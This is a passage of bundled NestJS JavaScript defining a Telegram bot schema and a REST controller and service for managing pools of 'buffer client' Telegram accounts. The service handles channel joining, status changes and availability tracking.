    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./bots.controller */ "./src/components/bots/bots.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./bots.module */ "./src/components/bots/bots.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./bots.service */ "./src/components/bots/bots.service.ts"), exports);
__exportStar(__webpack_require__(/*! ./dto */ "./src/components/bots/dto/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./schemas */ "./src/components/bots/schemas/index.ts"), exports);


/***/ }),

/***/ "./src/components/bots/schemas/bot.schema.ts":
/*!***************************************************!*\
  !*** ./src/components/bots/schemas/bot.schema.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BotSchema = exports.Bot = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const bots_service_1 = __webpack_require__(/*! ../bots.service */ "./src/components/bots/bots.service.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let Bot = class Bot {
};
exports.Bot = Bot;
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Bot.prototype, "token", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Bot.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ enum: bots_service_1.ChannelCategory }),
    (0, mongoose_1.Prop)({ required: true, enum: bots_service_1.ChannelCategory }),
    __metadata("design:type", String)
], Bot.prototype, "category", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Bot.prototype, "channelId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: false }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], Bot.prototype, "description", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)({ default: Date.now }),
    __metadata("design:type", Date)
], Bot.prototype, "lastUsed", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)({ type: Object }),
    __metadata("design:type", Object)
], Bot.prototype, "stats", void 0);
exports.Bot = Bot = __decorate([
    (0, mongoose_1.Schema)({ timestamps: true })
], Bot);
exports.BotSchema = mongoose_1.SchemaFactory.createForClass(Bot);


/***/ }),

/***/ "./src/components/bots/schemas/index.ts":
/*!**********************************************!*\
  !*** ./src/components/bots/schemas/index.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./bot.schema */ "./src/components/bots/schemas/bot.schema.ts"), exports);


/***/ }),

/***/ "./src/components/buffer-clients/buffer-client.controller.ts":
/*!*******************************************************************!*\
  !*** ./src/components/buffer-clients/buffer-client.controller.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BufferClientController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const buffer_client_service_1 = __webpack_require__(/*! ./buffer-client.service */ "./src/components/buffer-clients/buffer-client.service.ts");
const create_buffer_client_dto_1 = __webpack_require__(/*! ./dto/create-buffer-client.dto */ "./src/components/buffer-clients/dto/create-buffer-client.dto.ts");
const search_buffer_client_dto_1 = __webpack_require__(/*! ./dto/search-buffer-client.dto */ "./src/components/buffer-clients/dto/search-buffer-client.dto.ts");
const buffer_client_schema_1 = __webpack_require__(/*! ./schemas/buffer-client.schema */ "./src/components/buffer-clients/schemas/buffer-client.schema.ts");
const update_buffer_client_dto_1 = __webpack_require__(/*! ./dto/update-buffer-client.dto */ "./src/components/buffer-clients/dto/update-buffer-client.dto.ts");
let BufferClientController = class BufferClientController {
    constructor(clientService) {
        this.clientService = clientService;
    }
    async create(createClientDto) {
        return this.clientService.create(createClientDto);
    }
    async search(query) {
        return this.clientService.search(query);
    }
    async updateInfo() {
        this.clientService.updateInfo();
        return 'initiated Checking';
    }
    async joinChannelsforBufferClients(clientId) {
        return this.clientService.joinchannelForBufferClients(true, clientId);
    }
    async checkbufferClients() {
        this.clientService.checkBufferClients();
        return 'initiated Checking';
    }
    async addNewUserstoBufferClients(body) {
        if (!body || !Array.isArray(body.goodIds) || !Array.isArray(body.badIds)) {
            throw new common_1.BadRequestException('goodIds and badIds must be arrays');
        }
        if (body.clientsNeedingBufferClients && !Array.isArray(body.clientsNeedingBufferClients)) {
            throw new common_1.BadRequestException('clientsNeedingBufferClients must be an array');
        }
        this.clientService.addNewUserstoBufferClients(body.badIds, body.goodIds, body.clientsNeedingBufferClients || [], undefined);
        return 'initiated Checking';
    }
    async findAll(status) {
        return this.clientService.findAll(status);
    }
    async setAsBufferClient(mobile, clientId) {
        return this.clientService.setAsBufferClient(mobile, clientId);
    }
    async executeQuery(query) {
        return this.clientService.executeQuery(query);
    }
    async getBufferClientDistribution() {
        return this.clientService.getBufferClientDistribution();
    }
    async getBufferClientsByClientId(clientId, status) {
        return this.clientService.getBufferClientsByClientId(clientId, status);
    }
    async getBufferClientsByStatus(status) {
        return this.clientService.findAll(status);
    }
    async updateStatus(mobile, body) {
        if (body.status !== 'active' && body.status !== 'inactive') {
            throw new common_1.BadRequestException('Status must be either "active" or "inactive"');
        }
        return this.clientService.updateStatus(mobile, body.status, body.message);
    }
    async markAsActive(mobile, body = {}) {
        return this.clientService.updateStatus(mobile, 'active', body.message);
    }
    async markAsInactive(mobile, body) {
        return this.clientService.markAsInactive(mobile, body.reason);
    }
    async markAsUsed(mobile, body = {}) {
        return this.clientService.markAsUsed(mobile, body.message);
    }
    async getNextAvailable(clientId) {
        return this.clientService.getNextAvailableBufferClient(clientId);
    }
    async getUnusedBufferClients(hoursAgo, clientId) {
        return this.clientService.getUnusedBufferClients(hoursAgo || 24, clientId);
    }
    async findOne(mobile) {
        return this.clientService.findOne(mobile);
    }
    async update(mobile, updateClientDto) {
        return this.clientService.update(mobile, updateClientDto);
    }
    async createdOrupdate(mobile, updateClientDto) {
        return this.clientService.createOrUpdate(mobile, updateClientDto);
    }
    async remove(mobile) {
        return this.clientService.remove(mobile);
    }
};
exports.BufferClientController = BufferClientController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create user data' }),
    (0, swagger_1.ApiBody)({ type: create_buffer_client_dto_1.CreateBufferClientDto }),
    (0, swagger_1.ApiResponse)({ type: buffer_client_schema_1.BufferClient }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_buffer_client_dto_1.CreateBufferClientDto]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search buffer client data' }),
    (0, swagger_1.ApiQuery)({ name: 'mobile', required: false, description: 'Mobile number' }),
    (0, swagger_1.ApiQuery)({ name: 'clientId', required: false, description: 'Client ID' }),
    (0, swagger_1.ApiQuery)({ name: 'username', required: false, description: 'Username' }),
    (0, swagger_1.ApiQuery)({ name: 'name', required: false, description: 'Name' }),
    (0, swagger_1.ApiQuery)({ name: 'channelLink', required: false, description: 'Channel link' }),
    (0, swagger_1.ApiQuery)({ name: 'repl', required: false, description: 'Repl link' }),
    (0, swagger_1.ApiQuery)({ name: 'isActive', required: false, description: 'Filter by active status' }),
    (0, swagger_1.ApiResponse)({ type: [buffer_client_schema_1.BufferClient] }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_buffer_client_dto_1.SearchBufferClientDto]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "search", null);
__decorate([
    (0, common_1.Get)('updateInfo'),
    (0, swagger_1.ApiOperation)({ summary: 'Update promote Clients Info' }),
    (0, swagger_1.ApiResponse)({ type: String }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "updateInfo", null);
__decorate([
    (0, common_1.Get)('joinChannelsForBufferClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Join Channels for BufferClients' }),
    (0, swagger_1.ApiQuery)({ name: 'clientId', required: false, description: 'Filter by specific client ID', type: String }),
    (0, swagger_1.ApiResponse)({ type: String }),
    __param(0, (0, common_1.Query)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "joinChannelsforBufferClients", null);
__decorate([
    (0, common_1.Get)('checkBufferClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Check Buffer Clients' }),
    (0, swagger_1.ApiResponse)({ type: String }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "checkbufferClients", null);
__decorate([
    (0, common_1.Post)('addNewUserstoBufferClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Add New Users to Buffer Clients' }),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                goodIds: { type: 'array', items: { type: 'string' } },
                badIds: { type: 'array', items: { type: 'string' } },
                clientsNeedingBufferClients: { type: 'array', items: { type: 'string' } }
            }
        }
    }),
    (0, swagger_1.ApiResponse)({ type: String }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "addNewUserstoBufferClients", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all buffer client data' }),
    (0, swagger_1.ApiQuery)({ name: 'status', required: false, description: 'Filter by status (active/inactive)' }),
    (0, swagger_1.ApiResponse)({ type: [buffer_client_schema_1.BufferClient] }),
    __param(0, (0, common_1.Query)('status')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "findAll", null);
__decorate([
    (0, common_1.Post)('SetAsBufferClient/:mobile/:clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Set as Buffer Client' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID to assign buffer client to', type: String }),
    (0, swagger_1.ApiResponse)({ type: String }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "setAsBufferClient", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "executeQuery", null);
__decorate([
    (0, common_1.Get)('distribution'),
    (0, swagger_1.ApiOperation)({ summary: 'Get buffer client distribution per client' }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "getBufferClientDistribution", null);
__decorate([
    (0, common_1.Get)('client/:clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get buffer clients by client ID' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID to get buffer clients for', type: String }),
    (0, swagger_1.ApiQuery)({ name: 'status', required: false, description: 'Filter by status (active/inactive)', type: String }),
    (0, swagger_1.ApiResponse)({ type: [buffer_client_schema_1.BufferClient] }),
    __param(0, (0, common_1.Param)('clientId')),
    __param(1, (0, common_1.Query)('status')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "getBufferClientsByClientId", null);
__decorate([
    (0, common_1.Get)('status/:status'),
    (0, swagger_1.ApiOperation)({ summary: 'Get buffer clients by status' }),
    (0, swagger_1.ApiParam)({ name: 'status', description: 'Status to filter by (active/inactive)', type: String }),
    (0, swagger_1.ApiResponse)({ type: [buffer_client_schema_1.BufferClient] }),
    __param(0, (0, common_1.Param)('status')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "getBufferClientsByStatus", null);
__decorate([
    (0, common_1.Patch)('status/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update status of a buffer client' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the buffer client', type: String }),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                status: { type: 'string', description: 'New status (active/inactive)' },
                message: { type: 'string', description: 'Status message (optional)' }
            },
            required: ['status']
        }
    }),
    (0, swagger_1.ApiResponse)({ type: buffer_client_schema_1.BufferClient }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "updateStatus", null);
__decorate([
    (0, common_1.Patch)('activate/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Mark a buffer client as active' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the buffer client', type: String }),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                message: { type: 'string', description: 'Activation message (optional)' }
            }
        }
    }),
    (0, swagger_1.ApiResponse)({ type: buffer_client_schema_1.BufferClient }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "markAsActive", null);
__decorate([
    (0, common_1.Patch)('deactivate/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Mark a buffer client as inactive' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the buffer client', type: String }),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                reason: { type: 'string', description: 'Reason for deactivation' }
            },
            required: ['reason']
        }
    }),
    (0, swagger_1.ApiResponse)({ type: buffer_client_schema_1.BufferClient }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "markAsInactive", null);
__decorate([
    (0, common_1.Patch)('mark-used/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Mark a buffer client as used (update lastUsed timestamp)' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the buffer client', type: String }),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                message: { type: 'string', description: 'Usage message (optional)' }
            }
        }
    }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "markAsUsed", null);
__decorate([
    (0, common_1.Get)('next-available/:clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get next available buffer client for a specific client' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID to get next available buffer client for', type: String }),
    (0, swagger_1.ApiResponse)({ type: buffer_client_schema_1.BufferClient }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "getNextAvailable", null);
__decorate([
    (0, common_1.Get)('unused'),
    (0, swagger_1.ApiOperation)({ summary: "Get buffer clients that haven't been used for a specified time period" }),
    (0, swagger_1.ApiQuery)({ name: 'hoursAgo', required: false, description: 'Hours ago cutoff (default: 24)', type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'clientId', required: false, description: 'Filter by specific client ID', type: String }),
    (0, swagger_1.ApiResponse)({ type: [buffer_client_schema_1.BufferClient] }),
    __param(0, (0, common_1.Query)('hoursAgo')),
    __param(1, (0, common_1.Query)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Number, String]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "getUnusedBufferClients", null);
__decorate([
    (0, common_1.Get)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    (0, swagger_1.ApiResponse)({ type: buffer_client_schema_1.BufferClient }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    (0, swagger_1.ApiBody)({ type: update_buffer_client_dto_1.UpdateBufferClientDto }),
    (0, swagger_1.ApiResponse)({ type: buffer_client_schema_1.BufferClient }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_buffer_client_dto_1.UpdateBufferClientDto]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "update", null);
__decorate([
    (0, common_1.Put)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    (0, swagger_1.ApiBody)({ type: update_buffer_client_dto_1.UpdateBufferClientDto }),
    (0, swagger_1.ApiResponse)({ type: buffer_client_schema_1.BufferClient }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_buffer_client_dto_1.UpdateBufferClientDto]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "createdOrupdate", null);
__decorate([
    (0, common_1.Delete)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete user data by ID' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    (0, swagger_1.ApiResponse)({ type: null }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "remove", null);
exports.BufferClientController = BufferClientController = __decorate([
    (0, swagger_1.ApiTags)('Buffer Clients'),
    (0, common_1.Controller)('bufferclients'),
    __metadata("design:paramtypes", [buffer_client_service_1.BufferClientService])
], BufferClientController);


/***/ }),

/***/ "./src/components/buffer-clients/buffer-client.module.ts":
/*!***************************************************************!*\
  !*** ./src/components/buffer-clients/buffer-client.module.ts ***!
  \***************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BufferClientModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const buffer_client_service_1 = __webpack_require__(/*! ./buffer-client.service */ "./src/components/buffer-clients/buffer-client.service.ts");
const buffer_client_controller_1 = __webpack_require__(/*! ./buffer-client.controller */ "./src/components/buffer-clients/buffer-client.controller.ts");
const buffer_client_schema_1 = __webpack_require__(/*! ./schemas/buffer-client.schema */ "./src/components/buffer-clients/schemas/buffer-client.schema.ts");
const Telegram_module_1 = __webpack_require__(/*! ../Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const active_channels_module_1 = __webpack_require__(/*! ../active-channels/active-channels.module */ "./src/components/active-channels/active-channels.module.ts");
const users_module_1 = __webpack_require__(/*! ../users/users.module */ "./src/components/users/users.module.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const channels_module_1 = __webpack_require__(/*! ../channels/channels.module */ "./src/components/channels/channels.module.ts");
const promote_client_module_1 = __webpack_require__(/*! ../promote-clients/promote-client.module */ "./src/components/promote-clients/promote-client.module.ts");
const session_manager_1 = __webpack_require__(/*! ../session-manager */ "./src/components/session-manager/index.ts");
const bots_1 = __webpack_require__(/*! ../bots */ "./src/components/bots/index.ts");
let BufferClientModule = class BufferClientModule {
};
exports.BufferClientModule = BufferClientModule;
exports.BufferClientModule = BufferClientModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: 'bufferClientModule', schema: buffer_client_schema_1.BufferClientSchema, collection: 'bufferClients' }]),
            (0, common_1.forwardRef)(() => Telegram_module_1.TelegramModule),
            (0, common_1.forwardRef)(() => users_module_1.UsersModule),
            (0, common_1.forwardRef)(() => active_channels_module_1.ActiveChannelsModule),
            (0, common_1.forwardRef)(() => client_module_1.ClientModule),
            (0, common_1.forwardRef)(() => channels_module_1.ChannelsModule),
            (0, common_1.forwardRef)(() => promote_client_module_1.PromoteClientModule),
            (0, common_1.forwardRef)(() => session_manager_1.SessionModule),
            bots_1.BotsModule
        ],
        controllers: [buffer_client_controller_1.BufferClientController],
        providers: [buffer_client_service_1.BufferClientService],
        exports: [buffer_client_service_1.BufferClientService]
    })
], BufferClientModule);


/***/ }),

/***/ "./src/components/buffer-clients/buffer-client.service.ts":
/*!****************************************************************!*\
  !*** ./src/components/buffer-clients/buffer-client.service.ts ***!
  \****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
var BufferClientService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BufferClientService = void 0;
const channels_service_1 = __webpack_require__(/*! ./../channels/channels.service */ "./src/components/channels/channels.service.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const Telegram_service_1 = __webpack_require__(/*! ../Telegram/Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const users_service_1 = __webpack_require__(/*! ../users/users.service */ "./src/components/users/users.service.ts");
const active_channels_service_1 = __webpack_require__(/*! ../active-channels/active-channels.service */ "./src/components/active-channels/active-channels.service.ts");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
const promote_client_service_1 = __webpack_require__(/*! ../promote-clients/promote-client.service */ "./src/components/promote-clients/promote-client.service.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
const connection_manager_1 = __webpack_require__(/*! ../Telegram/utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
const session_manager_1 = __webpack_require__(/*! ../session-manager */ "./src/components/session-manager/index.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
const channelinfo_1 = __webpack_require__(/*! ../../utils/telegram-utils/channelinfo */ "./src/utils/telegram-utils/channelinfo.ts");
const path_1 = __importDefault(__webpack_require__(/*! path */ "path"));
const cloudinary_1 = __webpack_require__(/*! ../../cloudinary */ "./src/cloudinary.ts");
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
const isPermanentError_1 = __importDefault(__webpack_require__(/*! ../../utils/isPermanentError */ "./src/utils/isPermanentError.ts"));
const checkMe_utils_1 = __webpack_require__(/*! ../../utils/checkMe.utils */ "./src/utils/checkMe.utils.ts");
const bots_1 = __webpack_require__(/*! ../bots */ "./src/components/bots/index.ts");
const client_helper_utils_1 = __webpack_require__(/*! ../shared/client-helper.utils */ "./src/components/shared/client-helper.utils.ts");
let BufferClientService = BufferClientService_1 = class BufferClientService {
    constructor(bufferClientModel, telegramService, usersService, activeChannelsService, clientService, channelsService, promoteClientService, sessionService, botsService) {
        this.bufferClientModel = bufferClientModel;
        this.telegramService = telegramService;
        this.usersService = usersService;
        this.activeChannelsService = activeChannelsService;
        this.clientService = clientService;
        this.channelsService = channelsService;
        this.promoteClientService = promoteClientService;
        this.sessionService = sessionService;
        this.botsService = botsService;
        this.logger = new utils_1.Logger(BufferClientService_1.name);
        this.joinChannelMap = new Map();
        this.joinChannelIntervalId = null;
        this.leaveChannelMap = new Map();
        this.leaveChannelIntervalId = null;
        this.isJoinChannelProcessing = false;
        this.isLeaveChannelProcessing = false;
        this.activeTimeouts = new Set();
        this.JOIN_CHANNEL_INTERVAL = 6 * 60 * 1000;
        this.LEAVE_CHANNEL_INTERVAL = 120 * 1000;
        this.LEAVE_CHANNEL_BATCH_SIZE = 10;
        this.CLIENT_PROCESSING_DELAY = 10000;
        this.CHANNEL_PROCESSING_DELAY = 20000;
        this.MAX_MAP_SIZE = 100;
        this.CLEANUP_INTERVAL = 15 * 60 * 1000;
        this.MAX_NEW_BUFFER_CLIENTS_PER_TRIGGER = 10;
        this.MIN_TOTAL_BUFFER_CLIENTS = 10;
        this.AVAILABILITY_WINDOWS = [
            { name: 'today', days: 0, minRequired: 3 },
            { name: 'tomorrow', days: 1, minRequired: 5 },
            { name: 'oneWeek', days: 7, minRequired: 7 },
